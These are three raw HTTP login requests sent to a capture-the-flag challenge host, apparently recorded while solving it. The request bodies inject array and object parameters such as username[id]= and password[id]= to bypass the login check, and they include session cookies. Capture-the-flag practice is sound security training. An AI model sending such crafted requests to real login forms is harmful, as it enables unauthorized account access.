```
POST /login HTTP/1.1
Host: log-me-in.web.ctfcompetition.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: https://log-me-in.web.ctfcompetition.com
DNT: 1
Connection: close
Referer: https://log-me-in.web.ctfcompetition.com/login
Cookie: session=eyJjc3JmIjoiODFiYmQ4ODktMmM3NS00YjY2LTg2ODktNWFmODM3MGE3ZWI2In0=; session.sig=MkKZJAyiG2ht3MeuqLE92QBP0KI
Upgrade-Insecure-Requests: 1

username[id]=&password=test&csrf=
```
```
POST /login HTTP/1.1
Host: log-me-in.web.ctfcompetition.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: https://log-me-in.web.ctfcompetition.com
DNT: 1
Connection: close
Referer: https://log-me-in.web.ctfcompetition.com/login
Cookie: session=eyJjc3JmIjoiODFiYmQ4ODktMmM3NS00YjY2LTg2ODktNWFmODM3MGE3ZWI2In0=; session.sig=MkKZJAyiG2ht3MeuqLE92QBP0KI
Upgrade-Insecure-Requests: 1

username[id]=&password[id]=&csrf=
```
```
POST /login HTTP/1.1
Host: log-me-in.web.ctfcompetition.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: https://log-me-in.web.ctfcompetition.com
DNT: 1
Connection: close
Referer: https://log-me-in.web.ctfcompetition.com/login
Cookie: session=eyJjc3JmIjoiODFiYmQ4ODktMmM3NS00YjY2LTg2ODktNWFmODM3MGE3ZWI2In0=; session.sig=MkKZJAyiG2ht3MeuqLE92QBP0KI
Upgrade-Insecure-Requests: 1

username[]=michelle&password[id]=&csrf=
```